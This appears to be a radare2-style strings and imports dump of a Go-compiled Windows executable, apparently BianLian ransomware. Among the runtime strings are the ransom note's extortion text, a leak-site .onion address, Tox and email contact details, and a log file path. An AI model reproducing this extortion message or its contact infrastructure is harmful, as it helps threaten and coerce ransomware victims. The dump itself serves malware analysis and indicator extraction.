Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000600  0xf3400 0x00401000  0xf4000 -r-x .text
1   0x000f3a00  0xe1e00 0x004f5000  0xe2000 -r-- .rdata
2   0x001d5800  0x1ea00 0x005d7000  0x7b000 -rw- .data
3   0x001f4200    0x600 0x00652000   0x1000 -rw- .idata
4   0x001f4800   0x4a00 0x00653000   0x5000 -r-- .reloc
5   0x001f9200    0x200 0x00658000   0x1000 -r-- .symtab

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00460b00 paddr=0x00060100 haddr=0x000000a8 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
――――――――――――――――――――――――――――――――――――――――――
1   0x005d7220 NONE FUNC kernel32.dll WriteFile
2   0x005d7228 NONE FUNC kernel32.dll WriteConsoleW
3   0x005d7230 NONE FUNC kernel32.dll WaitForMultipleObjects
4   0x005d7238 NONE FUNC kernel32.dll WaitForSingleObject
5   0x005d7240 NONE FUNC kernel32.dll VirtualQuery
6   0x005d7248 NONE FUNC kernel32.dll VirtualFree
7   0x005d7250 NONE FUNC kernel32.dll VirtualAlloc
8   0x005d7258 NONE FUNC kernel32.dll SwitchToThread
9   0x005d7260 NONE FUNC kernel32.dll SuspendThread
10  0x005d7268 NONE FUNC kernel32.dll SetWaitableTimer
11  0x005d7270 NONE FUNC kernel32.dll SetUnhandledExceptionFilter
12  0x005d7278 NONE FUNC kernel32.dll SetProcessPriorityBoost
13  0x005d7280 NONE FUNC kernel32.dll SetEvent
14  0x005d7288 NONE FUNC kernel32.dll SetErrorMode
15  0x005d7290 NONE FUNC kernel32.dll SetConsoleCtrlHandler
16  0x005d7298 NONE FUNC kernel32.dll ResumeThread
17  0x005d72a0 NONE FUNC kernel32.dll PostQueuedCompletionStatus
18  0x005d72a8 NONE FUNC kernel32.dll LoadLibraryA
19  0x005d72b0 NONE FUNC kernel32.dll LoadLibraryW
20  0x005d72b8 NONE FUNC kernel32.dll SetThreadContext
21  0x005d72c0 NONE FUNC kernel32.dll GetThreadContext
22  0x005d72c8 NONE FUNC kernel32.dll GetSystemInfo
23  0x005d72d0 NONE FUNC kernel32.dll GetSystemDirectoryA
24  0x005d72d8 NONE FUNC kernel32.dll GetStdHandle
25  0x005d72e0 NONE FUNC kernel32.dll GetQueuedCompletionStatusEx
26  0x005d72e8 NONE FUNC kernel32.dll GetProcessAffinityMask
27  0x005d72f0 NONE FUNC kernel32.dll GetProcAddress
28  0x005d72f8 NONE FUNC kernel32.dll GetEnvironmentStringsW
29  0x005d7300 NONE FUNC kernel32.dll GetConsoleMode
30  0x005d7308 NONE FUNC kernel32.dll FreeEnvironmentStringsW
31  0x005d7310 NONE FUNC kernel32.dll ExitProcess
32  0x005d7318 NONE FUNC kernel32.dll DuplicateHandle
33  0x005d7320 NONE FUNC kernel32.dll CreateWaitableTimerExW
34  0x005d7328 NONE FUNC kernel32.dll CreateThread
35  0x005d7330 NONE FUNC kernel32.dll CreateIoCompletionPort
36  0x005d7338 NONE FUNC kernel32.dll CreateFileA
37  0x005d7340 NONE FUNC kernel32.dll CreateEventA
38  0x005d7348 NONE FUNC kernel32.dll CloseHandle
39  0x005d7350 NONE FUNC kernel32.dll AddVectoredExceptionHandler

[Symbols]

nth paddr      vaddr      bind type size lib          name
2337 0x00123996 0x00524f96 2044 2044 .rdata  ascii   Unable to determine system directoryaccessing a corrupted shared librarycompressed name in SRV resource datacrypto/cipher: input not full blocksedwards25519: invalid point encodinginvalid boolean value %q for -%s: %vmethod ABI and value ABI don't alignruntime: VirtualQuery failed; errno=runtime: bad notifyList size - sync=runtime: invalid pc-encoded table f=runtime: invalid typeBitsBulkBarrierruntime: marked free object in span runtime: mcall called on m->g0 stackruntime: sudog with non-nil waitlinkruntime: unblock on closing polldescruntime: wrong goroutine in newstackryuFtoaFixed64 called with prec > 18strings.Builder.Grow: negative countsyntax error scanning complex numberuncaching span but s.allocCount == 0) is smaller than minimum page size (2220446049250313080847263336181640625_cgo_notify_runtime_init_done missingall goroutines are asleep - deadlock!cannot exec a shared library directlycipher: message authentication failedcrypto/cipher: invalid buffer overlapcrypto/rsa: public exponent too largecrypto/rsa: public exponent too smallfailed to reserve page summary memoryinternal error: unknown network type logWorkTime: unknown mark worker modemethod ABI and value ABI do not alignreflect.Value.Bytes of non-byte slicereflect: funcLayout of non-func type runtime.minit: duplicatehandle failedruntime: allocation size out of rangeruntime: unexpected SPWRITE function setprofilebucket: profile already setstartTheWorld: inconsistent mp->nextptoo many Additionals to pack (>65535)too many Authorities to pack (>65535)value too large for defined data type1110223024625156540423631668090820312555511151231257827021181583404541015625Unable to determine system directory: arg size to reflect.call more than 1GBcan not access a needed shared libraryconcurrent map iteration and map writeencoding alphabet is not 64-bytes longgcBgMarkWorker: blackening not enabledindex out of range [%x] with length %yinsufficient data for base length typem changed unexpectedly in cgocallbackgmakechan: invalid channel element typeruntime: blocked 
2338 0x00124192 0x00525792 2044 2044 .rdata  ascii   read on free polldescruntime: sudog with non-false isSelecttime: missing Location in call to Dateunreachable method called. linker bug?2006-01-02 15:04:05.999999999 -0700 MST277555756156289135105907917022705078125heapBitsSetTypeGCProg: small allocationmismatched count during itab table copymspan.sweep: bad span state after sweepout of memory allocating heap arena mapruntime: blocked write on free polldescruntime: casfrom_Gscanstatus failed gp=stack growth not allowed in system callsuspendG from non-preemptible goroutinetraceback: unexpected SPWRITE function transport endpoint is already connected13877787807814456755295395851135253906256938893903907228377647697925567626953125MapIter.Key called on exhausted iteratoraddress family not supported by protocolbulkBarrierPreWrite: unaligned argumentscannot free workbufs when work.full != 0crypto/cipher: output smaller than inputdeferproc: d.panic != nil after newdeferrefill of span with free space remainingruntime.SetFinalizer: first argument is runtime.preemptM: duplicatehandle failedruntime: SyscallN has too many argumentsruntime: out of memory: cannot allocate runtime: typeBitsBulkBarrier with type  ryuFtoaFixed32 called with negative prec34694469519536141888238489627838134765625MapIter.Next called on exhausted iteratorattempted to add zero-sized address rangebinary: varint overflows a 64-bit integercan't call pointer on a non-pointer ValuegcSweep being done but phase is not GCoffmheap.freeSpanLocked - invalid span statemheap.freeSpanLocked - invalid stack freeobjects added out of order or overlappingruntime.SetFinalizer: second argument is runtime: blocked read on closing polldescruntime: typeBitsBulkBarrier without typestopTheWorld: not stopped (stopwait != 0)strconv: illegal AppendInt/FormatInt baseunexpected call to os.Exit(0) during test173472347597680709441192448139190673828125867361737988403547205962240695953369140625MapIter.Value called on exhausted iteratoracquireSudog: found s.elem != nil in cacheinsufficient data for resource body lengthnon-empty mark q
2339 0x0012498e 0x00525f8e 2032 2033 .rdata  ascii   ueue after concurrent markon a locked thread with no template threadout of memory allocating checkmarks bitmappersistentalloc: align is not a power of 2runtime: blocked write on closing polldescsync/atomic: store of nil value into Valueunexpected signal during runtime executionedwards25519: invalid point encoding lengthgcBgMarkWorker: unexpected gcMarkWorkerModegrew heap, but no adequate free space foundheapBitsSetTypeGCProg: unexpected bit countinterrupted system call should be restartedmethodValueCallFrameObjs is not in a modulemult64bitPow10: power of 10 is out of rangemultiple Read calls return no data or errornon in-use span found with specials bit setroot level max pages doesn't fit in summaryruntime.SetFinalizer: finalizer already setruntime.SetFinalizer: first argument is nilruntime: casfrom_Gscanstatus bad oldval gp=runtime: heapBitsSetTypeGCProg: total bits runtime: releaseSudog with non-nil gp.paramruntime:stoplockedm: lockedg (atomicstatus=unfinished open-coded defers in deferreturnunknown runnable goroutine during bootstrapactive sweepers found at start of mark phasecompileCallback: float results not supportedencoding alphabet contains newline charactergcmarknewobject called while doing checkmarkinsufficient data for calculated length typemult128bitPow10: power of 10 is out of rangeout of memory allocating heap arena metadatareflect: funcLayout with interface receiver runtime: lfstack.push invalid packing: node=use of WriteTo with pre-connected connectionAlternative way: swikipedia@onionmail.org\r\n\r\ncannot send after transport endpoint shutdowncharacter string exceeds maximum length (255)exitsyscall: syscall frame is no longer validheapBitsSetType: called with non-pointer typeparsing/packing of this section has completedreflect: internal error: invalid method indexruntime.minit: duplicatehandle failed; errno=runtime: CreateWaitableTimerEx failed; errno=runtime: failed mSpanList.remove span.npages=scavengeOne called with unaligned work region (bad use of unsafe.Pointer? try -d=checkptr)
2340 0x0012517f 0x0052677f 2039 2039 .rdata  ascii   compileCallback: float arguments not supportededwards25519: invalid field element input sizemath/big: mismatched montgomery number lengthsmemory reservation exceeds address space limitpanicwrap: unexpected string after type name: reflect.Value.Slice: slice index out of boundsreleased less than one physical page of memoryruntime: failed to create new OS thread (have runtime: name offset base pointer out of rangeruntime: panic before malloc heap initialized\nruntime: text offset base pointer out of rangeruntime: type offset base pointer out of rangesignal arrived during external code execution\nslice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to pallocChunkBytesC:\Users\Public\MicrosoftEdge_38728293_logs.txtP has cached GC work at end of mark terminationattempting to link in too many shared librariesfunction symbol table not sorted by PC offset: racy sudog adjustment due to parking on channelruntime: CreateIoCompletionPort failed (errno= slice bounds out of range [::%x] with length %yCreateWaitableTimerEx when creating timer failedcould not find GetSystemTimeAsFileTime() syscallnot enough significant bits after mult64bitPow10parsing/packing of this type isn't available yetruntime.preemptM: duplicatehandle failed; errno=runtime: waitforsingleobject unexpected; result=runtime: waitforsingleobject wait_failed; errno=slice bounds out of range [:%x] with capacity %ystrconv: illegal AppendFloat/FormatFloat bitSizecasgstatus: waiting for Gwaiting but is Grunnabledelayed zeroing on data that may contain pointersfully empty unfreed span set block found in resetinvalid memory address or nil pointer dereferenceinvalid or incomplete multibyte or wide characternot enough significant bits after mult128bitPow10panicwrap: unexpected string after package name: reflect.Value.Slice: slice of unaddressable arrayruntime: unexpected waitm - semaphore out of syncs.allocCount != s.nelems && freeIndex == s.nelemsslice bounds out of range [::%x] with capacity %yswe
2341 0x00125976 0x00526f76 2036 2036 .rdata  ascii   eper left outstanding across sweep generationsattempt to execute system stack code on user stackcompileCallback: function argument frame too largemallocgc called with gcphase == _GCmarkterminationrecursive call during initialization - linker skewruntime: unable to acquire - semaphore out of syncx509: missing ASN.1 contents; use ParseCertificatefatal: systemstack called from unexpected goroutinepotentially overlapping in-use allocations detectedruntime: netpoll: PostQueuedCompletionStatus failedcasfrom_Gscanstatus: gp->status is not in scan statecrypto/rsa: message too long for RSA public key sizemallocgc called without a P or outside bootstrappingruntime.SetFinalizer: pointer not in allocated blockruntime: GetQueuedCompletionStatusEx failed (errno= runtime: use of FixAlloc_Alloc before FixAlloc_Init\nspan set block with unpopped elements found in resetcompileCallback: argument size is larger than uintptrreflect.Value.Slice: string slice index out of bounds\tgoroutine running on other thread; stack unavailable\nbytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: polling on unsupported descriptor typename is not in canonical format (it must end with a .)no goroutines (main called runtime.Goexit) - deadlock!runtime: signal received on thread not created by Go.\nx509: cannot verify signature: algorithm unimplemented is currently not supported for use in system callbacksSOFTWARE\Microsoft\Windows NT\CurrentVersion\Time Zonescasfrom_Gscanstatus:top gp->status is not in scan statecipher.NewCBCEncrypter: IV length must equal block sizegentraceback callback cannot be used with non-zero skipos: invalid use of WriteAt on file opened with O_APPENDreflect: internal error: invalid use of makeMethodValuefailed to allocate aligned heap memory; too many retriesin gcMark expecting to see gcphase as _GCmarkterminationnon-empty pointer map passed for non-pointer-size valuesprofilealloc called without a P or outside bootstrappingstrings: illegal use of no
2342 0x0012616a 0x0052776a 2034 2034 .rdata  ascii   n-zero Builder copied by valuegentraceback cannot trace user goroutine on its own stackruntime: checkmarks found unexpected unmarked object obj=sync: WaitGroup misuse: Add called concurrently with WaitAdd user with the following ID to get your instructions:\r\nreflect: reflect.Value.Elem on an invalid notinheap pointersync/atomic: store of inconsistently typed value into Valuesync: WaitGroup is reused before previous Wait has returnedaddr range base and limit are not in the same memory segmentmanual span allocation called with non-manually-managed typeruntime: GetQueuedCompletionStatusEx returned invalid mode= runtime: netpoll: PostQueuedCompletionStatus failed (errno= abiRegArgsType needs GC Prog, update methodValueCallFrameObjs0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZfound bad pointer in Go heap (incorrect use of unsafe or cgo?)reflect: reflect.Value.Pointer on an invalid notinheap pointerruntime: internal error: misuse of lockOSThread/unlockOSThreadABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_compileCallback: expected function with one uintptr-sized resultruntime.SetFinalizer: pointer not at beginning of allocated blockunable to query buffer size from InitializeProcThreadAttributeListbytes.Buffer: UnreadByte: previous operation was not a successful readcannot convert slice with length %y to pointer to array with length %xtoo many concurrent operations on a single file or socket (max 1048575)MapIter.Next called on an iterator that does not have an associated map ValueTo contact us you have to download "tox" messenger: https://qtox.github.io/\r\n\r\nA4B3B0845DA242A64BF17E0DB4278EDF85855739667D3E2AE8B89D5439015F07E81D12D767FC\r\n\r\nQueryPerformanceFrequency syscall returned zero, running on unsupported hardwarereflect.Value.Interface: cannot return value obtained from unexported field or methodQueryPerformanceFrequency overflow 32 bit divider, check nosplit discussion to proceedreflect: New of type that ma
2343 0x0012695c 0x00527f5c 1054 1055 .rdata  ascii   y not be allocated in heap (possibly undefined cgo C type)runtime: warning: IsLongPathAwareProcess failed to enable long paths; proceeding in fixup mode\nYou should know that we have been downloading data from your network for a significant time before the attack: financial, client, business, post, technical and personal files.\r\n00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899Your network systems were attacked and encrypted. Contact us in order to restore your data. Don't make any changes in your file structure: touch no files, don't try to recover by yourself, that may lead to it's complete loss.\r\n\r\nIn 10 days - it will be posted at our site http://bianlianlbc5an4kgnay3opdemgcryg2kpfcbgczopmm3dnbz3uaunad.onion with links send to your clients, partners, competitors and news agencies, that will lead to a negative impact on your company: potential financial, business and reputational loses.\r\n
2344 0x00126fa8 0x005285a8 4    5    .rdata  ascii   h\bp\b
2345 0x00128bd0 0x0052a1d0 4    5    .rdata  ascii   *(((
2346 0x00128f0d 0x0052a50d 5    6    .rdata  ascii   \b \b(\b
2347 0x00128f4e 0x0052a54e 4    5    .rdata  ascii   \b \b(
2348 0x00129180 0x0052a780 4    5    .rdata  ascii   IIII
2349 0x0012941e 0x0052aa1e 4    5    .rdata  ascii    \b(\b
2350 0x0012956d 0x0052ab6d 4    5    .rdata  ascii   27\a\v
2351 0x0012960c 0x0052ac0c 4    5    .rdata  ascii   %%%!
2352 0x00129699 0x0052ac99 4    5    .rdata  ascii    \b(\b
2353 0x00129878 0x0052ae78 4    5    .rdata  ascii   \b \b(
2354 0x001298d3 0x0052aed3 7    8    .rdata  ascii   \b \b(\b0\b
2355 0x001298e4 0x0052aee4 4    5    .rdata  ascii   \b \b(
2356 0x0012992d 0x0052af2d 7    8    .rdata  ascii   \b \b(\b0\b
2357 0x0012993f 0x0052af3f 4    5    .rdata  ascii   (\b0\b
2358 0x0012994b 0x0052af4b 7    8    .rdata  ascii   \b \b(\b0\b
2359 0x00129bce 0x0052b1ce 5    6    .rdata  ascii   \b \b(\b
2360 0x00129bdf 0x0052b1df 5    6    .rdata  ascii   \b \b(\b
2361 0x00129bf1 0x0052b1f1 4    5    .rdata  ascii    \b(\b
2362 0x00129c02 0x0052b202 4    5    .rdata  ascii    \b(\b
2363 0x00129c74 0x0052b274 5    6    .rdata  ascii   \r\f\f\f\f
2364 0x00129c88 0x0052b288 8    9    .rdata  ascii   \t\t\t\t\t\b\b\b
2365 0x00129d2f 0x0052b32f 9    10   .rdata  ascii   \b \b(\b0\b8\b
2366 0x00129d45 0x0052b345 4    5    .rdata  ascii   (\b0\b
2367 0x00129d65 0x0052b365 6    7    .rdata  ascii    \b(\b0\b
2368 0x00129d75 0x0052b375 4    5    .rdata  ascii   \b \b(
2369 0x00129d89 0x0052b389 4    5    .rdata  ascii    \b(\b
2370 0x00129d95 0x0052b395 9    10   .rdata  ascii   \b \b(\b0\b8\b
2371 0x00129da8 0x0052b3a8 4    5    .rdata  ascii    \b(\b
2372 0x00129db8 0x0052b3b8 5    6    .rdata  ascii   \b \b(\b
2373 0x00129e34 0x0052b434 5    6    .rdata  ascii   HHHHH
2374 0x00129e6d 0x0052b46d 4    5    .rdata  ascii    e"e
2375 0x00129efa 0x0052b4fa 8    9    .rdata  ascii   \v\a\n\a\n\a\b\a
2376 0x00129f88 0x0052b588 4    5    .rdata  ascii   c!(,
2377 0x00129fd5 0x0052b5d5 6    7    .rdata  ascii    \b(\b0\b
2378 0x00129fea 0x0052b5ea 4    5    .rdata  ascii   (\b0\b
2379 0x0012a00c 0x0052b60c 5    6    .rdata  ascii   \v\v\v\v\t
2380 0x0012a02a 0x0052b62a 5    6    .rdata  ascii   \b \b(\b
2381 0x0012a04a 0x0052b64a 5    6    .rdata  ascii   \b \b(\b
2382 0x0012a06a 0x0052b66a 5    6    .rdata  ascii   \b \b(\b
2383 0x0012a08a 0x0052b68a 5    6    .rdata  ascii   \b \b(\b
2384 0x0012a0aa 0x0052b6aa 5    6    .rdata  ascii   \b \b(\b
2385 0x0012a0bd 0x0052b6bd 5    6    .rdata  ascii   \b \b(\b
2386 0x0012a0d2 0x0052b6d2 6    7    .rdata  ascii   0\b8\b@\b
2387 0x0012a0e3 0x0052b6e3 5    6    .rdata  ascii   \b \b(\b
2388 0x0012b686 0x0052cc86 4    10   .rdata  utf16le \b\f\n\v
2389 0x0012b69f 0x0052cc9f 4    5    .rdata  ascii   (\b0\b
2390 0x0012b6c8 0x0052ccc8 4    5    .rdata  ascii   3###
2391 0x0012b6e2 0x0052cce2 4    5    .rdata  ascii    \b(\b
2392 0x0012b6f7 0x0052ccf7 4    5    .rdata  ascii   (\b0\b
2393 0x0012b70a 0x0052cd0a 5    6    .rdata  ascii   \b \b(\b
2394 0x0012b710 0x0052cd10 4    5    .rdata  ascii   0\b8\b
2395 0x0012b71f 0x0052cd1f 5    6    .rdata  ascii   \b \b(\b
2396 0x0012b725 0x0052cd25 4    5    .rdata  ascii   0\b8\b
2397 0x0012b735 0x0052cd35 6    7    .rdata  ascii    \b(\b0\b
2398 0x0012b74c 0x0052cd4c 6    7    .rdata  ascii    \b(\b0\b
2399 0x0012b76e 0x0052cd6e 13   14   .rdata  ascii   \b \b(\b0\b8\b@\bH\b
2400 0x0012b789 0x0052cd89 9    10   .rdata  ascii   \b \b(\b0\b8\b
2401 0x0012b7a0 0x0052cda0 6    7    .rdata  ascii   0\b8\b@\b
2402 0x0012b7cb 0x0052cdcb 6    7    .rdata  ascii   (\b0\b8\b
2403 0x0012b7d7 0x0052cdd7 4    5    .rdata  ascii   \b \b(
2404 0x0012b7de 0x0052cdde 6    7    .rdata  ascii   0\b8\b@\b
2405 0x0012b7f4 0x0052cdf4 5    24   .rdata  utf32le \a𐀆\b\a\f blocks=Basic Latin,Linear B Syllabary
2406 0x0012b879 0x0052ce79 8    9    .rdata  ascii   \b \b(\b0\b8
2407 0x0012b884 0x0052ce84 4    5    .rdata  ascii   @\bH\b
2408 0x0012b88c 0x0052ce8c 18   19   .rdata  ascii   (\b0\b8\b@\bH\bP\bX\b`\bh\b
2409 0x0012b8a5 0x0052cea5 15   16   .rdata  ascii   \b \b(\b0\b8\b@\bH\bP\b
2410 0x0012b8c2 0x0052cec2 5    6    .rdata  ascii   \b \b(\b
2411 0x0012b8c9 0x0052cec9 4    5    .rdata  ascii   0\b8\b
2412 0x0012b8d8 0x0052ced8 4    5    .rdata  ascii   \r\r\f\f
2413 0x0012b8dd 0x0052cedd 10   11   .rdata  ascii   \f\f\f\f\f\f\f\f\f\f
2414 0x0012b8f1 0x0052cef1 5    6    .rdata  ascii   \b \b(\b
2415 0x0012b8f8 0x0052cef8 4    5    .rdata  ascii   0\b8\b
2416 0x0012bef3 0x0052d4f3 5    6    .rdata  ascii   \b \b(\b
2417 0x0012befa 0x0052d4fa 6    7    .rdata  ascii   0\b8\b@\b
2418 0x0012bf1a 0x0052d51a 5    6    .rdata  ascii   \b \b(\b
2419 0x0012bf21 0x0052d521 6    7    .rdata  ascii   0\b8\b@\b
2420 0x0012bf3a 0x0052d53a 5    6    .rdata  ascii   \b \b(\b
2421 0x0012bf41 0x0052d541 6    7    .rdata  ascii   0\b8\b@\b
2422 0x0012bf74 0x0052d574 6    14   .rdata  utf16le pbheml
2423 0x0012c001 0x0052d601 4    5    .rdata  ascii   (\b0\b
2424 0x0012c007 0x0052d607 4    5    .rdata  ascii   8\b@\b
2425 0x0012c01f 0x0052d61f 4    5    .rdata  ascii   \f\r\f\f
2426 0x0012c027 0x0052d627 6    7    .rdata  ascii   \fd\fP\f\n
2427 0x0012c0ba 0x0052d6ba 5    6    .rdata  ascii   \b \b(\b
2428 0x0012c0c1 0x0052d6c1 6    7    .rdata  ascii   0\b8\b@\b
2429 0x0012c0c8 0x0052d6c8 6    7    .rdata  ascii   H\bP\bX\b
2430 0x0012c0d5 0x0052d6d5 6    7    .rdata  ascii   (\b0\b8\b
2431 0x0012c0dd 0x0052d6dd 6    7    .rdata  ascii   @\bH\bP\b
2432 0x0012c0e5 0x0052d6e5 6    7    .rdata  ascii   X\b`\bh\b
2433 0x0012c0f1 0x0052d6f1 6    7    .rdata  ascii   0\b8\b@\b
2434 0x0012c104 0x0052d704 4    5    .rdata  ascii   \b \b(
2435 0x0012c16a 0x0052d76a 6    7    .rdata  ascii   0\b8\b@\b
2436 0x0012c188 0x0052d788 5    6    .rdata  ascii   \b \b(\b
2437 0x0012c18f 0x0052d78f 6    7    .rdata  ascii   0\b8\b@\b
2438 0x0012c197 0x0052d797 6    7    .rdata  ascii   H\bP\bX\b
2439 0x0012c1f8 0x0052d7f8 4    10   .rdata  utf16le $ %4
2440 0x0012c203 0x0052d803 6    7    .rdata  ascii   (\b0\b8\b
2441 0x0012c20b 0x0052d80b 6    7    .rdata  ascii   @\bH\bP\b
2442 0x0012c213 0x0052d813 6    7    .rdata  ascii   X\b`\bh\b
2443 0x0012c30d 0x0052d90d 4    5    .rdata  ascii   (\b0\b
2444 0x0012c313 0x0052d913 4    5    .rdata  ascii   8\b@\b
2445 0x0012c319 0x0052d919 4    5    .rdata  ascii   H\bP\b
2446 0x0012e288 0x0052f888 6    7    .rdata  ascii   &\t&\t&\t
2447 0x0012e290 0x0052f890 21   22   .rdata  ascii   &\t&\t&\t&\t&\t&\t"\t \t \t \t 
2448 0x00138244 0x00539844 5    24   .rdata  utf32le \aZaࣼķ blocks=Basic Latin,Arabic Extended-A,Latin Extended-A
2449 0x001382f8 0x005398f8 5    24   .rdata  utf32le \aZaࣼθ blocks=Basic Latin,Arabic Extended-A,Greek and Coptic
2450 0x00139718 0x0053ad18 5    24   .rdata  utf32le \bZaࣼÌ blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2451 0x001398a8 0x0053aea8 5    24   .rdata  utf32le \bZaࣼë blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2452 0x00139bc8 0x0053b1c8 5    24   .rdata  utf32le \bZaࣼŹ blocks=Basic Latin,Arabic Extended-A,Latin Extended-A
2453 0x0013a21c 0x0053b81c 5    24   .rdata  utf32le \tZaࣼɐ blocks=Basic Latin,Arabic Extended-A,IPA Extensions
2454 0x0013a3ac 0x0053b9ac 5    24   .rdata  utf32le \aZaࣼČ blocks=Basic Latin,Arabic Extended-A,Latin Extended-A
2455 0x0013a49c 0x0053ba9c 5    24   .rdata  utf32le \bZaࣼĸ blocks=Basic Latin,Arabic Extended-A,Latin Extended-A
2456 0x0013a58c 0x0053bb8c 5    24   .rdata  utf32le \tZaࣼǋ blocks=Basic Latin,Arabic Extended-A,Latin Extended-B
2457 0x0013a820 0x0053be20 5    24   .rdata  utf32le \tZaࣼƝ blocks=Basic Latin,Arabic Extended-A,Latin Extended-B
2458 0x0013a9b0 0x0053bfb0 5    24   .rdata  utf32le \aZaࣼÄ blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2459 0x0013a9d8 0x0053bfd8 5    24   .rdata  utf32le \tZaࣼÔ blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2460 0x0013aab4 0x0053c0b4 5    24   .rdata  utf32le \tZaࣼð blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2461 0x0013ab68 0x0053c168 5    24   .rdata  utf32le \aZaࣼŻ blocks=Basic Latin,Arabic Extended-A,Latin Extended-A
2462 0x0013ab90 0x0053c190 5    24   .rdata  utf32le \tZaࣼǆ blocks=Basic Latin,Arabic Extended-A,Latin Extended-B
2463 0x0013b3b0 0x0053c9b0 5    24   .rdata  utf32le \nZaࣼî blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2464 0x0013b464 0x0053ca64 5    24   .rdata  utf32le \aZaࣼ¯ blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2465 0x0013b4a0 0x0053caa0 5    24   .rdata  utf32le \nZaࣼû blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2466 0x0013b590 0x0053cb90 5    24   .rdata  utf32le \nZaࣼƾ blocks=Basic Latin,Arabic Extended-A,Latin Extended-B
2467 0x0013b748 0x0053cd48 5    24   .rdata  utf32le \bZaࣼɽ blocks=Basic Latin,Arabic Extended-A,IPA Extensions
2468 0x0013b770 0x0053cd70 5    24   .rdata  utf32le \nZaࣼʟ blocks=Basic Latin,Arabic Extended-A,IPA Extensions
2469 0x0013b93c 0x0053cf3c 5    24   .rdata  utf32le \tZaࣼʪ blocks=Basic Latin,Arabic Extended-A,IPA Extensions
2470 0x0013bb30 0x0053d130 5    24   .rdata  utf32le \nZaࣼǬ blocks=Basic Latin,Arabic Extended-A,Latin Extended-B
2471 0x0013bdec 0x0053d3ec 5    24   .rdata  utf32le \tZaࣼՒ blocks=Basic Latin,Arabic Extended-A,Armenian
2472 0x0013be14 0x0053d414 4    20   .rdata  utf32le \vZaࣼ blocks=Basic Latin,Arabic Extended-A
2473 0x0013c1fc 0x0053d7fc 5    24   .rdata  utf32le \tZaࣼÚ blocks=Basic Latin,Arabic Extended-A,Latin-1 Supplement
2474 0x0013c300 0x0053d900 5    24   .rdata  utf32le \tZaࣼˣ blocks=Basic Latin,Arabic Extended-A,Spacing Modifier Letters
2475 0x0013c3f0 0x0053d9f0 5    24   .rdata  utf32le \b./⼧˖ blocks=Basic Latin,Kangxi Radicals,Spacing Modifier Letters
2476 0x0013c42c 0x0053da2c 5    24   .rdata  utf32le \v./⼧˽ blocks=Basic Latin,Kangxi Radicals,Spacing Modifier Letters
2477 0x0013c4f4 0x0053daf4 5    24   .rdata  utf32le \b./⼧Ō blocks=Basic Latin,Kangxi Radicals,Latin Extended-A
2478 0x0013c51c 0x0053db1c 10   44   .rdata  utf32le \n.*⼎ǣ\n./⼧ǥ blocks=Basic Latin,Kangxi Radicals,Latin Extended-B
2479 0x0013c620 0x0053dc20 5    24   .rdata  utf32le \nZaࣼǪ blocks=Basic Latin,Arabic Extended-A,Latin Extended-B
2480 0x0013c6e4 0x0053dce4 4    20   .rdata  utf32le p\a:ញ blocks=Basic Latin,Khmer
2481 0x0013d020 0x0053e620 5    24   .rdata  utf32le \bZaࣼͮ blocks=Basic Latin,Arabic Extended-A,Combining Diacritical Marks
2482 0x0013d070 0x0053e670 5    24   .rdata  utf32le \fZaࣼξ blocks=Basic Latin,Arabic Extended-A,Greek and Coptic
